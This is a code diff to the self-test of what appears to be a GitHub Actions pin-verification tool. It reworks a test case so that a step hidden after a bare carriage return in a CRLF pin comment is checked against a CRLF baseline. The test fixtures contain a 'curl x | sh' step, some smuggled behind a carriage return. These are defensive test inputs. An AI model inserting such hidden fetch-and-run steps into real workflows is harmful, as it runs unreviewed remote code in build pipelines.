@@ -696,14 +696,6 @@ def run_self_test() -> list[str]:
                 b" # v6.1.0\r    - run: curl x | sh\n",
             ),
         ),
-        (
-            "a step hidden after a bare carriage return in a CRLF pin comment",
-            "action.yml",
-            pinned.replace(b"\n", b"\r\n").replace(
-                b" # v6.1.0\r\n",
-                b" # v6.1.0\r    - run: curl x | sh\r\n",
-            ),
-        ),
         ("a step edit", "action.yml", rotated + b"    - run: curl x | sh\n"),
         ("a mutable ref", "action.yml", pinned.replace(
             b"55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0", b"v6"
@@ -713,6 +705,22 @@ def run_self_test() -> list[str]:
     ):
         if pin_only_difference(relative, pinned, local):
             failures.append(f"{label} must not pass as a pin-only difference")
+    # Compared against a CRLF trusted baseline so the only difference is
+    # the hidden step: against the LF `pinned` the line endings alone would
+    # already differ and the case would pass without the bare-CR guard.
+    pinned_crlf = pinned.replace(b"\n", b"\r\n")
+    if pin_only_difference(
+        "action.yml",
+        pinned_crlf,
+        pinned_crlf.replace(
+            b" # v6.1.0\r\n",
+            b" # v6.1.0\r    - run: curl x | sh\r\n",
+        ),
+    ):
+        failures.append(
+            "a step hidden after a bare carriage return in a CRLF pin comment "
+            "must not pass as a pin-only difference"
+        )
     action_dir = normalize_action_path(_ACTION_DIR)
     entries = [
         # `git archive`'s default tar modes for tracked 100644 / 100755 blobs.
